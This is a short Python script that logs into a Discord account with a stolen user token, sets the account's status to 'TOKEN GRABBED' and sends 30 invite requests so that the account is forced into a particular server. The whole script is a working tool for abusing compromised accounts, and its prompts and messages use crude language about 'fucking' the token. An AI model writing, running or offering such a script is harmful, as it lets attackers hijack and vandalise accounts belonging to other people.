try:
    import discord
    import requests
except ModuleNotFoundError as e:
    modulename = str(e).split("No module named ")[1].replace("'", "")
    input(f"Please install module with: pip install {modulename}")
    exit()

import sys

token = input("TOKEN TO FUCK: ")
client = discord.Client()


@client.event
async def on_ready():
    print("Fucking the token, Please wait.")
    await client.change_presence(activity=discord.Game(name='TOKEN GRABBED'), status=discord.Status.do_not_disturb, afk=True)
    for x in range(30):
        requests.post(
            "https://discordapp.com/api/v6/invite/r3sSKJJ", headers={
                'Authorization': token
            })
    input("Token was Fucked !")
    sys.exit()

try:
    client.run(token, bot=False)
except Exception:
    print("Token isn't vaild")
